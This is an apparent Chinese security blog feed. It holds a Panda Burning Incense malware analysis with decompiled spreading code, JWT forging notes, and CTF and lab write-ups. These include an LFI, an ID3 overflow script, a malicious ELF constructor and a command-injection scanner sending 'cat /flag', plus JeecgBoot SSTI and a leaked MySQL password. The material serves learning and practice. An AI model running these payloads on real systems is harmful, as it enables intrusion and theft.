sub_406028(); sub_405FA8(); sub_404018(); if ( v4 ) { p_n296 = (int *)sub_4060B4(); CloseHandle_0(hObject); goto LABEL_7; } } CloseHandle_0(hObject); LOBYTE(p_n296) = 1;LABEL_7: __writefsdword(0, v6[0]); sub_403C68(&amp;loc_40620D); sub_403C44(); return p_n296;} 2.4 传播机制 移动存储传播: 通过U盘、移动硬盘等设备传播 网络共享传播: 访问 admin$ 共享 使用 NetShareEnum 枚举网络共享 创建 svcshare 共享 局域网传播: 扫描局域网内的其他计算机 sub_40B768函数–负责网络传播 1234567891011121314151617FARPROC sub_40B768(){ HMODULE hModule; FARPROC result; // 1. 加载 netapi32.dll（Windows 网络管理 API 库） hModule = LoadLibraryA(&quot;netapi32.dll&quot;); // 2. 获取三个关键函数的地址： NetShareEnum = (DWORD (__stdcall *)(...)) GetProcAddress(hModule, &quot;NetShareEnum&quot;); NetApiBufferFree = (DWORD (__stdcall *)(LPVOID)) GetProcAddress(hModule, &quot;NetApiBufferFree&quot;); result = GetProcAddress(hModule, &quot;NetShareEnum&quot;); // 3. 保存函数地址到全局变量 dword_40E79C = (int)result; return result;} 加载网络API库 ，为后续的网络共享枚举准备。它动态加载 netapi32.dll 并获取 NetShareEnum 和 NetApiBufferFree 函数地址，这些函数用于枚举网络共享资源。病毒后续会利用这些函数来寻找局域网内的其他计算机，实现网络传播。 通过 LoadLibraryA 加载 netapi32.dll 动态库 使用 GetProcAddress 获取 NetShareEnum 和 NetApiBufferFree 函数地址 利用 NetShareEnum 枚举网络中的共享资源 通过弱密码攻击获取访问权限，然后复制病毒文件 TimerFunc函数：负责移动存储设备传播 大致流程如下 123456789sub_403F18(&quot;:\\\\setup.exe&quot;, v17); // 设置setup.exe路径sub_403F18(&quot;:\\\\autorun.inf&quot;, v16); // 设置autorun.inf路径// 创建autorun.inf文件并写入自动运行配置sub_402AD8();*off_40D2BC = 2; // 文件写入模式sub_402874(); // 可能是写入[AutoRun]部分sub_402614(); // 写入命令sub_404260(); // 可能写入OPEN=setup.exe 调用 sub_403F18 创建 setup.exe 和 autorun.inf 文件 使用 SetFileAttributesA 设置文件属性（隐藏、系统） 利用 CopyFileA 复制病毒文件到移动存储设备 通过 autorun.inf 配置自动运行项，实现设备插入自动执行 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145void __stdcall TimerFunc(){ int v0; // ebx char v1; // zf const CHAR *lpFileName; // esi const CHAR *lpExistingFileName; // eax const CHAR *lpExistingFileName_1; // eax const CHAR *lpFileName_1; // esi HANDLE hObject; // eax const CHAR *lpFileName_2; // eax HANDLE hObject_1; // eax const CHAR *lpFileName_3; // eax const CHAR *lpFileName_4; // eax const CHAR *lpNewFileName; // [esp-20h] [ebp-248h] const CHAR *lpNewFileName_1; // [esp-20h] [ebp-248h] unsigned int v13[3]; // [esp-18h] [ebp-240h] BYREF unsigned int v14[2]; // [esp-Ch] [ebp-234h] BYREF int *v15; // [esp-4h] [ebp-22Ch] int v16; // [esp+24h] [ebp-204h] int v17; // [esp+28h] [ebp-200h] int v18; // [esp+34h] [ebp-1F4h] int v19; // [esp+40h] [ebp-1E8h] int v20; // [esp+224h] [ebp-4h] int savedregs; // [esp+228h] [ebp+0h] BYREF v15 = &amp;savedregs; v14[1] = (unsigned int)&amp;loc_40C016; v14[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v14); v13[2] = (unsigned int)&amp;savedregs; v13[1] = (unsigned int)&amp;loc_40BFE1; v13[0] = (unsigned int)NtCurrentTeb()-&gt;NtTib.ExceptionList; __writefsdword(0, (unsigned int)v13); sub_403C44(); sub_403C44(); sub_403C44(); sub_40B9D8(); if ( v20 ) { v0 = sub_403ECC(); if ( v0 &gt;= 1 ) { do { sub_403E2C(); ((void (*)(void))sub_40B9A4)(); sub_40B9A4(v19); if ( !sub_4041B4() ) { sub_403E2C(); sub_40B9A4(v13[0]); sub_40B9A4(v18); if ( !sub_4041B4() ) { sub_403E2C(); sub_403F18(&quot;:\\\\setup.exe&quot;, v17); sub_403E2C(); sub_403F18(&quot;:\\\\autorun.inf&quot;, v16); if ( (unsigned __int8)sub_40B994() ) { sub_40277C(); sub_40BA84(); sub_40BA84(); sub_404018(); if ( !v1 ) { lpFileName = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName, 0x80u); if ( !DeleteFileA(lpFileName) ) break; sub_403E2C(); sub_403ED4(); lpNewFileName = (const CHAR *)sub_4040CC(); sub_40277C(); lpExistingFileName = (const CHAR *)sub_4040CC(); if ( !CopyFileA(lpExistingFileName, lpNewFileName, 0) ) break; } } else { sub_403E2C(); sub_403ED4(); lpNewFileName_1 = (const CHAR *)sub_4040CC(); sub_40277C(); lpExistingFileName_1 = (const CHAR *)sub_4040CC(); if ( !CopyFileA(lpExistingFileName_1, lpNewFileName_1, 0) ) break; } if ( (unsigned __int8)sub_40B994() ) { sub_40BA84(); sub_404018(); if ( !v1 ) { lpFileName_1 = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName_1, 0x80u); if ( !DeleteFileA(lpFileName_1) ) break; hObject = CreateFileA_0(lpFileName_1, 0x40000000u, 0, 0, 2u, 0, 0); CloseHandle_0(hObject); sub_402AD8(); *off_40D2BC = 2; sub_402874(); sub_402614(); sub_404260(); sub_402B88(); sub_402614(); sub_402C48(); sub_402614(); } } else { lpFileName_2 = (const CHAR *)sub_4040CC(); hObject_1 = CreateFileA_0(lpFileName_2, 0x40000000u, 0, 0, 2u, 0, 0); CloseHandle_0(hObject_1); sub_402AD8(); *off_40D2BC = 2; sub_402874(); sub_402614(); sub_404260(); sub_402B88(); sub_402614(); sub_402C48(); sub_402614(); } sub_403E2C(); sub_403ED4(); lpFileName_3 = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName_3, 7u); lpFileName_4 = (const CHAR *)sub_4040CC(); SetFileAttributesA(lpFileName_4, 7u); } } --v0; } while ( v0 ); } } __writefsdword(0, v13[0]); __writefsdword(0, v14[0]); sub_403C68(&amp;loc_40C01D); sub_403C68(v15);} 像什么u盘，手机，一插到电脑就会继续传播 这个或许就是当年为什么传播范围这么广的原因(○´･д･)ﾉ 2.5 文件感染流程 创建 .bat 批处理文件进行自我复制和清理 感染可执行文件和系统文件 创建大量隐藏文件 遍历磁盘文件，识别可执行文件 创建或修改 Desktop_.ini 文件（病毒的标记文件） 通过 SetFileAttributesA 设置文件属性，通常为隐藏和系统属性 使用 GetLocalTime 获取系统时间，可能用于感染时间标记 执行文件感染操作，通常是将病毒代码附加到正常文件中 实现异常处理机制避免感染过程中出错导致病毒被发现 3. 危害分析 文件损坏: 感染并损坏大量可执行文件 系统破坏: 修改系统文件和注册表，导致系统不稳定 数据丢失: 可能删除或损坏重要数据文件 网络瘫痪: 在局域网内快速传播，消耗网络资源 安全隐患: 关闭安全软件，使系统暴露在其他恶意软件攻击下 后门功能: 可能留有远程控制后门，导致系统被完全控制 4. 病毒来源根据代码特征和历史信息： 1.该病毒是”熊猫烧香”病毒的2.0版本，最初由中国”whboy”（李俊）编写 2.是2006-2007年间在中国广泛传播的知名病毒变种 3.主要针对Windows XP等早期Windows操作系统，现在win11，10都采用Windows NT内核 5. 解决方案5.1 紧急处理 断网隔离: 立即断开被感染计算机的网络连接 终止恶意进程: 结束 spoclsv.exe 等可疑进程 禁用自启动项: 删除注册表中的自启动项和启动目录中的恶意程序 5.2 清除步骤 删除恶意文件: 删除 %WINDIR%\\drivers\\spoclsv.exe 删除所有 Desktop_.ini 文件 删除所有 autorun.inf 文件 删除启动目录中的恶意程序 清理注册表: 删除 HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run 中的可疑项 恢复 HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Advanced\\Folder\\Hidden\\SHOWALL\\CheckedValue 的值为1 使用杀毒工具: 使用杀毒软件进行全面扫描 推荐使用专杀工具进行清理 5.3 恢复与预防 系统恢复: 从干净的备份恢复系统或重装系统 更新补丁: 安装所有系统安全补丁 加强防护: 安装并更新杀毒软件 禁用自动运行功能 关闭不必要的网络共享 对U盘等移动存储设备进行扫描后再使用 定期备份重要数据 6. 总结熊猫烧香2.0是一种具有强破坏性和传染性的计算机病毒，通过多种方式实现自启动和传播。感染后会导致系统异常、数据损坏和安全隐患。及时的隔离、清除和预防措施是应对此类病毒的关键。","link":"/2025/12/11/%E4%BC%A0%E7%BB%9F%E7%97%85%E6%AF%92%E5%8F%8D%E5%88%86%E6%9E%90%E6%80%9D%E8%B7%AF/"},{"title":"","text":"JWT 攻击 JWT，常用三种手法：未校验签名、禁用哈希、暴破弱密钥。 未校验签名： 某些服务端并未校验 JWT 签名，所以，尝试修改 token 后直接发给服务端，查看结果。于是，将 user 字段值从 admin123 改为 admin 后，重新生成新 token：jwt在线解密/加密 - JSON中文网 直接把username改成admin再去编码发现500错误 继续下一个攻击 禁用哈希。JWT 第一部分含有 alg 字段，该字段指定生成签名采用哪种哈希算法，该站使用的是 HS256，可将该字段篡改为none，某些 JWT 的实现，一旦发现 alg 为 none，将不再生成哈希签名，自然不存在校验签名一说 https://jwt.io/#debugger将 alg 为 none 视为恶意行为，所以，无法通过在线工具生成 JWT： 所以直接使用 python的 pyjwt库 用 none 算法生成的 JWT 只有两部分了，根本连签名都没生成。将新的 token 发给服务端 依旧500错误 暴破弱密钥。 在GitHub上面找到一个py脚本https://github.com/Ch1ngg/JWTPyCrack","link":"/2025/12/11/jwt/"},{"title":"","text":"信呼OA文件上传","link":"/2025/12/11/%E4%BF%A1%E5%91%BCOA%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"title":"","text":"CISCN2019 总决赛 Day1 Web1–滑稽云音乐 打开环境，F12就看到提示了 大概就是firmware有个关键点、需要管理员这里我们不知道密码所以先尝试注册一个登录进去 注册这个 1md5(code+&quot;MWQIRZQf&quot;)[:5]==&quot;e4e62&quot; 大概就是验证码逻辑写个脚本去爆 1234567891011121314import hashlib def find_code(): target_prefix = &quot;e4e62&quot; suffix = &quot;MWQIRZQf&quot; for i in range(1000000): # 假设 code 是一个整数，可以调整范围 code = str(i) combined = code + suffix hash_value = hashlib.md5(combined.encode()).hexdigest() if hash_value[:5] == target_prefix: return code code = find_code() print(&quot;Found code:&quot;, code) 注册成功，登陆进去 这里bota替换掉 1234cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==php://filter/read=convert.base64-encode/resource=share.php 然后去curl源码 123456789101112131415161718192021222324252627282930313233C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPXNoYXJlLnBocA==&quot;#share.php&lt;?php# For sharing files in /media directory, do not delete, you can modify# 分享功能，用来分享/media文件夹下的文件。不可删除，可以按需修改。ini_set('display_errors','Off');error_reporting(0);header('Content-Type: application/octet-stream');$filepath=base64_decode($_SERVER['QUERY_STRING']);if (strlen($filepath)&lt;=0) exit();$file=fopen($filepath,&quot;rb&quot;);if ($file==FALSE) exit();ob_clean();while(!feof($file)){ print(fread($file,1024*8)); ob_flush(); flush();}curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2hvdGxvYWQucGhw&quot;php://filter/read=convert.base64-encode/resource=../hotload.php#hotload.php&lt;?phpinclude_once 'include/config.php';@$page=$_GET['page'];if (isset($page)) $page=(string) $page;if (!isset($page)||strlen($page)&lt;=0) $page='index';$whitelist=array('index','fm','mv','friend','disk','upload','share','favor','login','reg','feedback','firmware','search','logout','info');if (!in_array($page,$whitelist,true)) $page='404';include &quot;include/$page.php&quot;; 上面代码看到Open: Pasted image 20251106201520 1.png 读取 12345678910111213141516171819202122232425C:\\Users\\11759&gt;curl -v &quot;http://f979b55d-35c1-4204-b41f-b188bb4f45c2.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvY29uZmlnLnBocA==&quot;php://filter/read=convert.base64-encode/resource=../include/config.php#config.php&lt;?phpini_set('display_errors','Off');error_reporting(0);date_default_timezone_set(&quot;Asia/Shanghai&quot;);ini_set('session.gc_maxlifetime',&quot;3600&quot;);ini_set(&quot;session.cookie_lifetime&quot;,&quot;3600&quot;);session_start();include 'init.php';$_GLOBALS['dbfile']=init_config('.sqlite');$_GLOBALS['salt']=write_config(init_config('.salt'));$_GLOBALS['admin_password']=write_config(init_config('.passwd'));if (strlen($_GLOBALS['dbfile'])&lt;=0||strlen($_GLOBALS['salt'])&lt;=0||strlen($_GLOBALS['admin_password'])&lt;=0){ ob_end_clean(); die('Permission denied!');}$_GLOBALS['dbfile']=__DIR__.'/../config/'.$_GLOBALS['dbfile'];?&gt; 看到init.php看一下 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950&lt;?php@mkdir(__DIR__.'/../config/');function rand_str($length = 16) { $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'; $charactersLength = strlen($characters); $randomString = ''; for ($i = 0; $i &lt; $length; $i++) { $randomString .= $characters[mt_rand(0, $charactersLength - 1)]; } return $randomString;}function get_filename($ext){ $files=scandir(__DIR__.'/../config/'); foreach ($files as $file) { if ($file != &quot;.&quot; &amp;&amp; $file != &quot;..&quot;) { if (substr($file,-strlen($ext))===$ext){ return $file; } } } return '';}function init_config($ext){ $file=get_filename($ext); if ($file==''){ $file=rand_str(8).$ext; file_put_contents(__DIR__.'/../config/'.$file, ''); if (!file_exists(__DIR__.'/../config/'.$file)){ $file==''; } } return $file;}function read_config($file){ return file_get_contents(__DIR__.'/../config/'.$file);}function write_config($file,$str = '',$length = 16){ $content=file_get_contents(__DIR__.'/../config/'.$file); if ($content==''){ if ($str=='') $str=rand_str($length); file_put_contents(__DIR__.'/../config/'.$file, $str); } return file_get_contents(__DIR__.'/../config/'.$file);}?&gt; 这里是看一下 parser.so文件从init_proc看起 123456789__int64 (**init_proc_0())(void){ __int64 (**__gmon_start_)(void); // rax __gmon_start_ = &amp;_gmon_start__; if ( &amp;_gmon_start__ ) return (__int64 (**)(void))_gmon_start__(); return __gmon_start_;} 没什么好看的继续看 123456789#init_procvoid *init_proc(){ frame_size = 0; frame_data = &amp;frame_data; memset(&amp;frame_data, 0, 0x100u); passwd = &amp;passwd; return memset(&amp;passwd, 0, 0x130u);} 第一次接触用pwn的web漏洞，喂给AI看一下 其中&amp;passwd在bss段中为93c0，而上面的&amp;frame_data在92c0。 frame_data 占用了 0x100 字节（256 字节），从 92C0 到 93C0 是连续的。 passwd 的起始地址为 93C0，说明它紧跟在 frame_data 之后。 如果对 frame_data 的数据写入超过了 0x100 字节，就可能越界到 passwd 的地址空间。由于PHP中的文件限制长度为0x130字节，因此有0x30的溢出读空间。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455#!/usr/bin/env python3 # coding:utf-8 # 专为 Python3 编写，无任何编码/拼接报错 def flat(*args): &quot;&quot;&quot;字节流拼接函数（仅处理字节类型，彻底避免类型错误）&quot;&quot;&quot; result = b&quot;&quot; for arg in args: if isinstance(arg, bytes): result += arg else: # 强制转换为字节（确保所有输入统一类型） raise TypeError(f&quot;仅支持 bytes 类型，传入了 {type(arg)}&quot;) return result # 1. 按你提供的结构，所有内容转为 bytes 类型（核心修改） mp3_tag = flat( b'ID3', # 标签标识（bytes） b'\\x03', # 主版本号（bytes） b'\\x00', # 修订号（bytes） b'\\x00', # 标志位（bytes） b'\\x00\\x00\\x04\\x00', # 标签头大小（bytes） b'TIT2', # 帧标识（bytes） b'\\x00\\x00\\x00\\x0a', # TIT2 帧大小（bytes） b'\\x00\\x00', # TIT2 帧标志（bytes） b'a'*9 + b'\\x00', # TIT2 内容（bytes，9个'a' + 结束符） b'TPE1', # 帧标识（bytes） b'\\x00\\x00\\x00\\x0a', # TPE1 帧大小（bytes） b'\\x00\\x00', # TPE1 帧标志（bytes） b'b'*9 + b'\\x00', # TPE1 内容（bytes，9个'b' + 结束符） b'TALB', # 帧标识（bytes） b'\\x00\\x00\\x02\\xff', # TALB 帧大小（bytes，按你提供的配置） b'\\x00\\x00', # TALB 帧标志（bytes） b'c'*0x200 + b'\\x00', # TALB 内容（bytes，512个'c' + 结束符） ) # 2. 添加标准 MP3 音频帧（确保文件被识别为有效 MP3，不报错） # 标准 MPEG-1 Layer 3 音频帧（44.1kHz 单声道，128kbps，持续0.5秒） mp3_audio = ( b'\\xff\\xf3\\xc4\\x40\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' b'\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x00' ) # 3. 拼接标签 + 音频，生成完整 MP3 文件 full_mp3 = mp3_tag + mp3_audio # 4. 写入文件（二进制模式，Python3 标准写法） output_file = &quot;fake_mp3_no_error.mp3&quot; with open(output_file, &quot;wb&quot;) as f: f.write(full_mp3) print(f&quot;✅ 零报错！伪造 MP3 已生成：{output_file}&quot;) print(f&quot;📌 标签结构完全按你的配置：ID3v2.3 + TIT2/TPE1/TALB 帧&quot;) print(f&quot;🎵 包含有效音频帧，可正常播放/上传绕过&quot;) 得到密码wc4I22tosZFIsUIk 用admin登录进去 也是成功登录了 来到/#firmware页面 这里老方法读取一下frimware代码 1curl -v &quot;http://af97e55c-3987-499d-99e5-e8acff7feafd.node5.buuoj.cn:81/media/share.php?cGhwOi8vZmlsdGVyL3JlYWQ9Y29udmVydC5iYXNlNjQtZW5jb2RlL3Jlc291cmNlPS4uL2luY2x1ZGUvZmlybXdhcmUucGhw&quot; 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169#firmware.php&lt;?phpif (!isset($_SESSION['user'])||strlen($_SESSION['user'])&lt;=0){ ob_end_clean(); header('Location: /hotload.php?page=login&amp;err=1'); die();}if ($_SESSION['role']!='admin'){ $padding='Lorem ipsum dolor sit amet, consectetur adipisicing elit.'; for($i=0;$i&lt;10;$i++) $padding.=$padding; die('&lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt;&lt;h3 style=&quot;color:red;margin-bottom:15px;&quot;&gt;只有管理员权限才能访问！&lt;/h3&gt;&lt;/div&gt;&lt;p style=&quot;visibility: hidden&quot;&gt;'.$padding.'&lt;/p&gt;&lt;/div&gt;');}if (isset($_FILES[&quot;file_data&quot;])){ if ($_FILES[&quot;file_data&quot;][&quot;error&quot;] &gt; 0||$_FILES[&quot;file_data&quot;][&quot;size&quot;] &gt; 1024*1024*1){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'上传出错，固件文件最大支持 1MB。'))); }else{ mt_srand(time()); $firmware_filename=md5(mt_rand().$_SESSION['user']); $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$firmware_filename.&quot;.elf&quot;; if (time()-$_SESSION['timestamp']&lt;3){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'操作太快了，请稍后再上传。'))); } $_SESSION['timestamp']=time(); move_uploaded_file($_FILES[&quot;file_data&quot;][&quot;tmp_name&quot;], $firmware_filename); $handle = fopen($firmware_filename, &quot;rb&quot;); if ($handle==FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'上传失败，未知原因。'))); } $flags = fread($handle, 4); fclose($handle); if ($flags!==&quot;\\x7fELF&quot;){ unlink($firmware_filename); ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'上传失败，不是有效的 ELF 文件。'))); } ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'上传成功！'))); }}else{ if (isset($_SERVER['CONTENT_TYPE'])){ if (stripos($_SERVER['CONTENT_TYPE'],'form-data')!=FALSE){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'上传出错，音乐文件最大支持 1MB。'))); } }}@$path=$_POST['path'];function clean_string($str){ $str=str_replace(&quot;\\\\&quot;,&quot;&quot;,$str); $str=str_replace(&quot;/&quot;,&quot;&quot;,$str); $str=str_replace(&quot;.&quot;,&quot;&quot;,$str); $str=str_replace(&quot;;&quot;,&quot;&quot;,$str); return substr($str,0,32);}if (isset($path)){ $path=clean_string(trim((string) $path)); if (strlen($path)&lt;=0||strlen($path)&gt;64){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'输入格式或长度不符合规定！'))); }else{ $firmware_filename=__DIR__.&quot;/../uploads/firmware/&quot;.$path.&quot;.elf&quot;; if (!file_exists($firmware_filename)){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'固件文件不存在！'))); }else{ try{ $elf = FFI::cdef(&quot; extern char * version; &quot;, $firmware_filename); $version=(string) FFI::string($elf-&gt;version); ob_end_clean(); die(json_encode(array('status'=&gt;1,'info'=&gt;'固件版本号：'.$version))); }catch(Error $e){ ob_end_clean(); die(json_encode(array('status'=&gt;0,'info'=&gt;'加载固件文件时发生错误！'))); } } }}?&gt;&lt;script&gt;nav_active();nav_user('&lt;?php echo @$_SESSION['user']; ?&gt;');&lt;/script&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput.min.css&quot;&gt; &lt;link rel=&quot;stylesheet&quot; href=&quot;css/fileinput-rtl.min.css&quot;&gt; &lt;script src=&quot;js/fileinput.min.js&quot;&gt;&lt;/script&gt; &lt;script src=&quot;js/locales/zh.js&quot;&gt;&lt;/script&gt; &lt;div&gt;&lt;div class=&quot;container&quot; style=&quot;margin-top:30px&quot;&gt; &lt;h3 style=&quot;margin-bottom:15px;&quot;&gt;固件更新&lt;/h3&gt; &lt;input id=&quot;upload&quot; type=&quot;file&quot; class=&quot;file&quot; data-preview-file-type=&quot;text&quot; &gt; &lt;div style=&quot;height:30px&quot;&gt;&lt;/div&gt; &lt;div id=&quot;info1&quot; class=&quot;alert&quot; role=&quot;alert&quot; style='display: none;'&gt;&lt;/div&gt; &lt;script&gt; $(&quot;#upload&quot;).fileinput({language: 'zh',uploadUrl: '/hotload.php?page=firmware'}); $(&quot;#upload&quot;).on(&quot;fileuploaded&quot;, function (event, data, previewId, index) { var data = data.response; if (data.status==1){ $('#info1').removeClass('alert-danger'); $('#info1').addClass('alert-success'); }else{ $('#info1').removeClass('alert-success'); $('#info1').addClass('alert-danger'); } $('#info1').html(data.info); $('#info1').show(); }); &lt;/script&gt; &lt;hr/&gt;&lt;h4 style=&quot;text-align:left;margin-bottom:15px;color:gray;&quot;&gt;调试模式（读取固件版本号)&lt;/h4&gt; &lt;div class='form-container'&gt; &lt;div class='form-group'&gt; &lt;input type=&quot;text&quot; class=&quot;form-control&quot; placeholder=&quot;固件文件&quot; id=&quot;path&quot;&gt; &lt;/div&gt; &lt;div class=&quot;form-group&quot;&gt; &lt;button class=&quot;btn btn-info btn-block&quot; onclick=&quot;submit()&quot;&gt;读取&lt;/button&gt; &lt;/div&gt; &lt;div id=&quot;info2&quot; class=&quot;alert&quot; role=&quot;alert&quot; style=&quot;display: none;&quot;&gt;&lt;/div&gt; &lt;/div&gt;&lt;/div&gt;&lt;script&gt;function submit(){ $('#info2').hide(); $.ajax({ type: 'POST', url: &quot;/hotload.php?page=firmware&quot;, data: {path: $('#path').val()}, dataType: &quot;json&quot;, success: function(data) { if (data.status==1){ $('#info2').removeClass('alert-danger'); $('#info2').addClass('alert-success'); }else{ $('#info2').removeClass('alert-success'); $('#info2').addClass('alert-danger'); } $('#info2').html(data.info); $('#info2').show(); } });}&lt;/script&gt; &lt;p style=&quot;visibility: hidden&quot;&gt; Lorem ipsum dolor sit amet, consectetur adipisicing elit. Animi aspernatur beatae commodi dolorem in praesentium quia quis sit ullam. Aut facere nihil non soluta temporibus. Modi molestias suscipit voluptate. A? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aliquid beatae consequatur deserunt earum eligendi ex, illum iure nostrum nulla obcaecati pariatur placeat quae reiciendis repellat similique tenetur totam vel voluptatum? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Aut autem consectetur cum ex expedita id incidunt inventore ipsa laudantium maiores nihil quia quo quod rem, reprehenderit repudiandae sunt unde voluptatibus? Lorem ipsum dolor sit amet, consectetur adipisicing elit. Accusantium ad adipisci animi, commodi cumque doloribus ducimus eaque eveniet illo iste, maxime, molestiae molestias neque nostrum odio officiis reiciendis rem voluptates? &lt;/p&gt; &lt;/div&gt; 在#firmware上传elf 1234567891011121314#include &lt;stdio.h&gt;#include &lt;string.h&gt;#include &lt;stdlib.h&gt;char _version[0x130];char *version = _version;__attribute__((constructor)) void fun() { memset(version, 0, 0x130); FILE *fp = popen(&quot;/usr/bin/tac /flag&quot;, &quot;r&quot;); if (fp == NULL) return; fread(version, 1, 0x100, fp); pclose(fp);} 编译成elf上传就可以了 爆破文件名 123456789101112131415161718192021222324&lt;?php function generate_filenames($start_time, $end_time, $user) { $results = []; for ($time = $start_time; $time &lt;= $end_time; $time++) { mt_srand($time); $rand = mt_rand(); $filename = md5($rand . $user); $results[] = $filename; } return $results; } // 已知信息 $user = &quot;admin&quot;; // 固定值 $date = strtotime(&quot;Tue, 11 Nov 2025 10:20:28 GMT&quot;); // 已知时间 $time_range = 100; // 时间偏移范围 ±100 秒 // 开始暴力破解 $start_time = $date - $time_range; $end_time = $date + $time_range; $possible_filenames = generate_filenames($start_time, $end_time, $user); foreach ($possible_filenames as $filename) { echo $filename . &quot;.elf\\n&quot;; } ?&gt; 去浏览器复制时间去爆破就行了然后把字典复制到bp里面爆就可以爆破出来 flag{iz4w8x9zjdsqael9fbv7c2l2qp5ao6f9}","link":"/2025/12/11/CISCN2019%20%E6%80%BB%E5%86%B3%E8%B5%9B%20Day1%20Web1--%E6%BB%91%E7%A8%BD%E4%BA%91%E9%9F%B3%E4%B9%90/"},{"title":"","text":"强网杯2019–高明的黑客 拿到很多奇怪的东西，跑脚本 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152import requestsimport osimport reurl = 'http://7f163133-d226-4d67-bffa-9c2366d4eab3.node5.buuoj.cn:81/'path = r'C:\\Users\\11759\\Downloads\\Compressed\\sss'ptn_get = re.compile(br&quot;\\$_GET\\['(\\w+)'\\]&quot;) #匹配文件里面的GET内容flag_ptn = re.compile(br&quot;\\{.*?\\}&quot;)print(&quot;========== 开始扫描 ==========\\n&quot;)for f in os.scandir(path): if not f.is_file() or not f.name.endswith(&quot;.php&quot;): continue print(f&quot;[+] 扫描文件：{f.name}&quot;) with open(f.path, &quot;rb&quot;) as fp: content = fp.read() params = set(ptn_get.findall(content)) if not params: continue for p in params: p = p.decode() print(f&quot; [+] 测试参数：{p}&quot;) try: r = requests.get( url + f.name, params={p: &quot;cat /flag&quot;}, timeout=8 ) except: continue if flag_ptn.search(r.content): print(&quot;\\n漏洞发现！&quot;) print(f&quot;文件：{f.name}&quot;) print(f&quot;参数：{p}&quot;) print(f&quot;PoC：{url}{f.name}?{p}=cat /flag&quot;) print(&quot;\\nflag:&quot;) print(r.text) exit()print(&quot;\\n========== 扫描结束：未发现命令执行 ==========&quot;)直接获取payload如下/xk0SzyKwfzw.php?Efa5BVG=cat /flag","link":"/2025/12/11/%E5%BC%BA%E7%BD%91%E6%9D%AF2019--%E9%AB%98%E6%98%8E%E7%9A%84%E9%BB%91%E5%AE%A2/"},{"title":"","text":"父子域搭建 父域：sky0.com dc主域控：192.168.64.11 pc成员域控：192.168.64.12 12345678910子域：hr.sky0.com dc:子域控 192.168.64.22 pc：成员主机 192.168.139.23子域：pc.sky0.com dc:子域控 192.168.64.33 pc：成员主机 192.168.64.34 域林：ga.sky0.com dc 孙子域控 192.168.64.36 pc 成员主机 192.168.64.36 父域：sky.com dc 子域控 192.168.64.44 pc 成员主机 192.168.64.45","link":"/2025/12/11/%E7%88%B6%E5%AD%90%E5%9F%9F%E6%90%AD%E5%BB%BA/"},{"title":"","text":"春秋云镜Finance–外网打靶 信息收集12fscan -h 39.101.71.180nmap 8.145.35.203 -p 22,80,3306,8081 -sCV 发现22,80,3306,8081都是开着的得到8081有JeecgBoot JeecgBoot web8081这里直接用工具扫一下扫到ssti 利用JeecgBoot jmreport/loadTableData SSTI模板注入漏洞 执行命令，但这个命令执行受限，我只要用一些特殊符号就报错，而且命令返回长度有限 通过PWD命令获取到当前网站工作目录，扫描的时候发现存在mysql,大概率网站配置文件中存在Mysql连接的相关配置信息，翻找目录并没有找到有用的配置文件。 在工作目录下可以发现有一个jar包，这个网站大概率是用这个jar包运行的， 直接用cp命令把这个jar包放到80端口网站目录 /var/www/html 下，然后访问路径即可下载这个jar包 显示失败但是是成功执行了的 下载好后，直接解压这个jar包，全局搜索3306马上就能找到mysql的配置信息 mysql利用username: rootpassword: oZOgpwlvgh2N01eS然后利用mdut 连接数据库GitHub - 